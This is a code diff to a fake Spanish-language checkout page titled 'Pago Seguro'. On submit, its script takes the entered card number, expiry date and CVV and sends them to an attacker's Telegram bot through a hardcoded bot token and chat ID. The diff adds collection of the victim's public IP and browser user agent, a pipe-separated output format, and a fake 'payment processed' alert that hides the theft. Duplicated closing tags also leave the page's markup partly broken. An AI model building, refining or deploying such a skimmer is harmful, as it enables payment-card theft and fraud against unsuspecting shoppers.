@@ -7,9 +7,9 @@
 <body>
     <h2>Pago Seguro</h2>
     <form id="checkout-form">
-        <input type="text" name="card" placeholder="Número de tarjeta"><br><br>
-        <input type="text" name="expiry" placeholder="MM/YY"><br><br>
-        <input type="text" name="cvv" placeholder="CVV"><br><br>
+        <input type="text" name="card" placeholder="Número de tarjeta" required><br><br>
+        <input type="text" name="expiry" placeholder="MM/YY" required><br><br>
+        <input type="text" name="cvv" placeholder="CVV" required><br><br>
         <button type="submit">Pagar</button>
     </form>
 
@@ -17,31 +17,41 @@
         const TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
         const CHAT_ID = '5654253897';
 
-        document.getElementById('checkout-form').addEventListener('submit', function (e) {
+        document.getElementById('checkout-form').addEventListener('submit', async function (e) {
             e.preventDefault();
 
             const card = this.card.value;
             const expiry = this.expiry.value;
             const cvv = this.cvv.value;
 
-            const message = `
-💳
-• Número: ${card}
-• Exp: ${expiry}
-• CVV: ${cvv}
-`;
+            // Obtener IP pública con api.ipify.org
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const ip = data.ip;
 
+            // Obtener user agent
+            const userAgent = navigator.userAgent;
+
+            // Armar mensaje en formato pedido
+            const message = `${card}|${expiry}|${cvv}|${ip}|${userAgent}`;
+
+            // Enviar mensaje a Telegram
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    text: message
                 })
             });
+
+            alert('Pago procesado con éxito'); // Opcional, puedes cambiar o eliminar
+            this.reset(); // Limpiar formulario
+        });
+    </script>
+</body>
+</html>
+
         });
     </script>
 </body>
